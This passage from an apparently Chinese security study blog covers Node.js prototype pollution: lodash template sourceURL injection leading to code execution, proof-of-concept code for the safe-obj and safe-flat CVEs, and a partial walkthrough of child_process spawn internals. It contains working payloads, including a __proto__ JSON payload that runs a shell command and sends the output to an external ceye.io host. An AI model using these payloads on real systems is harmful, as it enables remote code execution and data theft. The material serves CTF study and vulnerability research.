<p>可以看到 sourceURL 属性是通过一个三元运算赋值，options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p>
<p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p>
<p>这里要注意的是 Function 内是没有 require 函数的，我们不能直接使用 require(‘child_process’)  ，但是我们可以使用 global.process.mainModule.constructor._load 这一串来代替，后续的调用就很简单了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u000areturn e =&gt; &#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()//&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>因为require不是全局的，他只存在于当前的模块范围，但是<code>new function</code>是在新的领域运行的，所以我们想利用的话要先将它引用过来</p>
<p>示例payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag_thepr0t0js&#x27;).toString();var req = require(&#x27;http&#x27;).request(`http://onsdtb.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="safe-obj模块原型链污染"><a href="#safe-obj模块原型链污染" class="headerlink" title="safe-obj模块原型链污染"></a>safe-obj模块原型链污染</h2><h3 id="CVE-2021-25928"><a href="#CVE-2021-25928" class="headerlink" title="CVE-2021-25928"></a>CVE-2021-25928</h3><p>版本： 1.0.0 至 1.0.2 </p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224142132326.png" alt="image-20241224142132326"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeObj = <span class="built_in">require</span>(<span class="string">&quot;safe-obj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeObj.<span class="title function_">expand</span>(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224142219740.png" alt="image-20241224142219740"></p>
<p>源码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">expand</span>: <span class="keyword">function</span> (<span class="params">obj, path, thing</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!path || <span class="keyword">typeof</span> thing === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  obj = <span class="title function_">isObject</span>(obj) &amp;&amp; obj !== <span class="literal">null</span> ? obj : &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> props = path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (props.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">    obj[props.<span class="title function_">shift</span>()] = thing;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> prop = props.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">if</span> (!(prop <span class="keyword">in</span> obj)) &#123;</span><br><span class="line">      obj[prop] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    _safe.<span class="title function_">expand</span>(obj[prop], props.<span class="title function_">join</span>(<span class="string">&#x27;.&#x27;</span>), thing);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>接递归按照 <code>.</code> 做分隔写入 obj，很明显可以原型链污染</p>
<h3 id="CVE-2021-25927"><a href="#CVE-2021-25927" class="headerlink" title="CVE-2021-25927"></a>CVE-2021-25927</h3><p>该漏洞存在于safe-flat，v2.0.0~v2.0.1版本中，POC如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeFlat = <span class="built_in">require</span>(<span class="string">&quot;safe-flat&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeFlat.<span class="title function_">unflatten</span>(&#123;<span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224142659705.png" alt="image-20241224142659705"></p>
<h2 id="PP2RCE深入学习"><a href="#PP2RCE深入学习" class="headerlink" title="PP2RCE深入学习"></a>PP2RCE深入学习</h2><h3 id="关于child-process的spawn"><a href="#关于child-process的spawn" class="headerlink" title="关于child_process的spawn"></a>关于child_process的spawn</h3><p>对于child_process，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p>
<p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p>
<p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，最后execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，其中spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">child.<span class="title function_">spawn</span>(&#123;</span><br><span class="line">    <span class="attr">file</span>: opts.<span class="property">file</span>,</span><br><span class="line">    <span class="attr">args</span>: opts.<span class="property">args</span>,</span><br><span class="line">    <span class="attr">cwd</span>: options.<span class="property">cwd</span>,</span><br><span class="line">    <span class="attr">windowsHide</span>: !!options.<span class="property">windowsHide</span>,</span><br><span class="line">    <span class="attr">windowsVerbatimArguments</span>: !!options.<span class="property">windowsVerbatimArguments</span>,</span><br><span class="line">    <span class="attr">detached</span>: !!options.<span class="property">detached</span>,</span><br><span class="line">    <span class="attr">envPairs</span>: opts.<span class="property">envPairs</span>,</span><br><span class="line">    <span class="attr">stdio</span>: options.<span class="property">stdio</span>,</span><br><span class="line">    <span class="attr">uid</span>: options.<span class="property">uid</span>,</span><br><span class="line">    <span class="attr">gid</span>: options.<span class="property">gid</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>以下面的代码为例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这行代码使用解构赋值从 Node.js 的 child_process 模块中引入 spawn 函数。spawn 函数用于在系统上启动一个新的进程。</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">.stdout.on(&#x27;data&#x27;, (data) =&gt; &#123; ... &#125;)</span></span><br><span class="line"><span class="string">通过监听子进程的标准输出（stdout），可以捕获执行 whoami 命令后的输出数据。</span></span><br><span class="line"><span class="string">on(&#x27;data&#x27;, callback) 事件触发器会在子进程的标准输出流中有数据时调用，并将该数据传递给回调函数。</span></span><br><span class="line"><span class="string">当接收到 whoami 命令的输出数据时，它会将数据作为字符串输出到控制台。stdout: <span class="subst">$&#123;data&#125;</span> 会在控制台打印出 &quot;stdout: &quot;，后面跟着当前用户名。</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>Node使用模块<code>child_process</code>建立子进程时，调用用户层面的 spawn 方法。初始化子进程的参数，步入<code>normalizeSpawnArguments</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">spawn</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">  options = <span class="title function_">normalizeSpawnArguments</span>(file, args, options);</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中，支持的 options 有：</p>
<ul>
<li><code>uid</code>：设置运行时的 UID</li>
<li><code>gid</code>：设置运行时的 GID</li>
<li><code>cwd</code>：程序的运行路径，默认为<code>process.cwd()</code>的返回结果</li>
<li><code>shell</code>：如果为<code>true</code>，将使用当前用户默认的 Shell 执行该命令，如果为字符串，将使用字符串中的内容作为 Shell</li>
</ul>
<p>所谓作为 Shell，假设该参数为<code>xxx</code>，那么上面的例子最终执行起来就是 <code>xxx -c whoami</code></p>
<ul>
<li><code>argv0</code>：这个内容会作为<code>argv[0]</code>的值，默认为<code>spawn</code>的第一个参数（<code>command</code>）值，若设置了<code>shell</code>，默认为<code>shell</code>值</li>
</ul>
<p>例如<code>shell</code>为<code>/bin/bash</code>，但<code>argv0</code>为<code>bash</code>，则程序的<code>cmdline</code>实际上是<code>bash -c &#39;whoami&#39;</code>，传递给程序的参数数组中，<code>$0</code>将是<code>bash</code></p>
<ul>
<li><code>env</code>：存储环境变量，例如<code>&#123;&quot;PATH&quot;:&quot;/usr/bin&quot;&#125;</code>，默认继承当前环境变量</li>
<li><code>stdio</code>：数组或字符串，控制子进程与父进程之间的输入输出流交互，可以为<code>pipe``inherit``ignore</code></li>
<li><code>detached</code>：当父进程终止后，继续运行，默认为<code>false</code></li>
</ul>
</blockquote>
<p>跟进<code>normalizeSpawnArguments</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152216836.png" alt="image-20250509152216836"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">normalizeSpawnArguments</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">if</span> (options === <span class="literal">undefined</span>)</span><br><span class="line">    options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line">  <span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_convertCustomFds</span>(options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">file</span>: file,</span><br><span class="line">    <span class="attr">args</span>: args,</span><br><span class="line">    <span class="attr">options</span>: options,</span><br><span class="line">    <span class="attr">envPairs</span>: envPairs</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当 options 不存在时将其命为空对象</p>
<p>然后获取 env 变量，首先对 options.env 是否存在做了判断，如果 options.env 为undefined则将环境变量<code>process.env</code>的值复制给 env</p>
<p>而后对 envPairs 这个数组进行push操作，其实就是 env 变量对应的键值对</p>
<p>在 node v18.0 中，它的代码变成了下面的形式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> envKeys) &#123;</span><br><span class="line">  <span class="keyword">const</span> value = env[key];</span><br><span class="line">  <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title function_">validateArgumentNullCheck</span>(key, <span class="string">`options.env[&#x27;<span class="subst">$&#123;key&#125;</span>&#x27;]`</span>);</span><br><span class="line">    <span class="title function_">validateArgumentNullCheck</span>(value, <span class="string">`options.env[&#x27;<span class="subst">$&#123;key&#125;</span>&#x27;]`</span>);</span><br><span class="line">    <span class="title class_">ArrayPrototypePush</span>(envPairs, <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用几个方法封装了同样的操作，不影响</p>
<p>很明显这里存在一个原型链污染的问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能</p>
<p>只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code></p>
<p>经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部 child_process 的实现</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241030155248475.png" alt="image-20241030155248475"></p>
<p>观察一下原生的spawn源码实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ChildProcess</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">spawn</span> = <span class="keyword">function</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">validateObject</span>(options, <span class="string">&#x27;options&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If no `stdio` option was given - use default</span></span><br><span class="line">  <span class="keyword">let</span> stdio = options.<span class="property">stdio</span> || <span class="string">&#x27;pipe&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  stdio = <span class="title function_">getValidStdio</span>(stdio, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ipc = stdio.<span class="property">ipc</span>;</span><br><span class="line">  <span class="keyword">const</span> ipcFd = stdio.<span class="property">ipcFd</span>;</span><br><span class="line">  stdio = options.<span class="property">stdio</span> = stdio.<span class="property">stdio</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_">validateOneOf</span>(options.<span class="property">serialization</span>, <span class="string">&#x27;options.serialization&#x27;</span>,</span><br><span class="line">                [<span class="literal">undefined</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;advanced&#x27;</span>]);</span><br><span class="line">  <span class="keyword">const</span> serialization = options.<span class="property">serialization</span> || <span class="string">&#x27;json&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ipc !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="comment">// Let child process know about opened IPC channel</span></span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">envPairs</span> === <span class="literal">undefined</span>)</span><br><span class="line">      options.<span class="property">envPairs</span> = [];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="title function_">validateArray</span>(options.<span class="property">envPairs</span>, <span class="string">&#x27;options.envPairs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ArrayPrototypePush</span>(options.<span class="property">envPairs</span>, <span class="string">`NODE_CHANNEL_FD=<span class="subst">$&#123;ipcFd&#125;</span>`</span>);</span><br><span class="line">    <span class="title class_">ArrayPrototypePush</span>(options.<span class="property">envPairs</span>,</span><br><span class="line">                       <span class="string">`NODE_CHANNEL_SERIALIZATION_MODE=<span class="subst">$&#123;serialization&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">validateString</span>(options.<span class="property">file</span>, <span class="string">&#x27;options.file&#x27;</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">spawnfile</span> = options.<span class="property">file</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">args</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">spawnargs</span> = [];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">validateArray</span>(options.<span class="property">args</span>, <span class="string">&#x27;options.args&#x27;</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">spawnargs</span> = options.<span class="property">args</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> err = <span class="variable language_">this</span>.<span class="property">_handle</span>.<span class="title function_">spawn</span>(options);<span class="comment">//这里喵喵喵~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~··</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run-time errors should emit an error, not throw an exception.</span></span><br><span class="line">  <span class="keyword">if</span> (err === <span class="variable constant_">UV_EACCES</span> ||</span><br><span class="line">      err === <span class="variable constant_">UV_EAGAIN</span> ||</span><br><span class="line">      err === <span class="variable constant_">UV_EMFILE</span> ||</span><br><span class="line">      err === <span class="variable constant_">UV_ENFILE</span> ||</span><br><span class="line">      err === <span class="variable constant_">UV_ENOENT</span>) &#123;</span><br><span class="line">    process.<span class="title function_">nextTick</span>(onErrorNT, <span class="variable language_">this</span>, err);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// There is no point in continuing when we&#x27;ve hit EMFILE or ENFILE</span></span><br><span class="line">    <span class="comment">// because we won&#x27;t be able to set up the stdio file descriptors.</span></span><br><span class="line">    <span class="keyword">if</span> (err === <span class="variable constant_">UV_EMFILE</span> || err === <span class="variable constant_">UV_ENFILE</span>)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="comment">// Close all opened fds on error</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; stdio.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> stream = stdio[i];</span><br><span class="line">      <span class="keyword">if</span> (stream.<span class="property">type</span> === <span class="string">&#x27;pipe&#x27;</span>) &#123;</span><br><span class="line">        stream.<span class="property">handle</span>.<span class="title function_">close</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_handle</span>.<span class="title function_">close</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="title function_">errnoException</span>(err, <span class="string">&#x27;spawn&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    process.<span class="title function_">nextTick</span>(onSpawnNT, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">pid</span> = <span class="variable language_">this</span>.<span class="property">_handle</span>.<span class="property">pid</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; stdio.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> stream = stdio[i];</span><br><span class="line">    <span class="keyword">if</span> (stream.<span class="property">type</span> === <span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stream.<span class="property">ipc</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">_closesNeeded</span>++;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The stream is already cloned and piped, thus stop its readable side,</span></span><br><span class="line">    <span class="comment">// otherwise we might attempt to read from the stream when at the same time</span></span><br><span class="line">    <span class="comment">// the child process does.</span></span><br><span class="line">    <span class="keyword">if</span> (stream.<span class="property">type</span> === <span class="string">&#x27;wrap&#x27;</span>) &#123;</span><br><span class="line">      stream.<span class="property">handle</span>.<span class="property">reading</span> = <span class="literal">false</span>;</span><br><span class="line">      stream.<span class="property">handle</span>.<span class="title function_">readStop</span>();</span><br><span class="line">      stream.<span class="property">_stdio</span>.<span class="title function_">pause</span>();</span><br><span class="line">      stream.<span class="property">_stdio</span>.<span class="property">readableFlowing</span> = <span class="literal">false</span>;</span><br><span class="line">      stream.<span class="property">_stdio</span>.<span class="property">_readableState</span>.<span class="property">reading</span> = <span class="literal">false</span>;</span><br><span class="line">      stream.<span class="property">_stdio</span>[kIsUsedAsStdio] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stream.<span class="property">handle</span>) &#123;</span><br><span class="line">      stream.<span class="property">socket</span> = <span class="title function_">createSocket</span>(<span class="variable language_">this</span>.<span class="property">pid</span> !== <span class="number">0</span> ?</span><br><span class="line">        stream.<span class="property">handle</span> : <span class="literal">null</span>, i &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">pid</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_closesNeeded</span>++;</span><br><span class="line">        stream.<span class="property">socket</span>.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">maybeClose</span>(<span class="variable language_">this</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">stdin</span> = stdio.<span class="property">length</span> &gt;= <span class="number">1</span> &amp;&amp; stdio[<span class="number">0</span>].<span class="property">socket</span> !== <span class="literal">undefined</span> ?</span><br><span class="line">    stdio[<span class="number">0</span>].<span class="property">socket</span> : <span class="literal">null</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">stdout</span> = stdio.<span class="property">length</span> &gt;= <span class="number">2</span> &amp;&amp; stdio[<span class="number">1</span>].<span class="property">socket</span> !== <span class="literal">undefined</span> ?</span><br><span class="line">    stdio[<span class="number">1</span>].<span class="property">socket</span> : <span class="literal">null</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">stderr</span> = stdio.<span class="property">length</span> &gt;= <span class="number">3</span> &amp;&amp; stdio[<span class="number">2</span>].<span class="property">socket</span> !== <span class="literal">undefined</span> ?</span><br><span class="line">    stdio[<span class="number">2</span>].<span class="property">socket</span> : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">stdio</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; stdio.<span class="property">length</span>; i++)</span><br><span class="line">    <span class="title class_">ArrayPrototypePush</span>(<span class="variable language_">this</span>.<span class="property">stdio</span>,</span><br><span class="line">                       stdio[i].<span class="property">socket</span> === <span class="literal">undefined</span> ? <span class="literal">null</span> : stdio[i].<span class="property">socket</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add .send() method and start listening for IPC data</span></span><br><span class="line">  <span class="keyword">if</span> (ipc !== <span class="literal">undefined</span>) <span class="title function_">setupChannel</span>(<span class="variable language_">this</span>, ipc, serialization);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的<code>this._handle.spawn</code>调用了 process_wrap.cc 的 spawn 来生成子进程：</p>
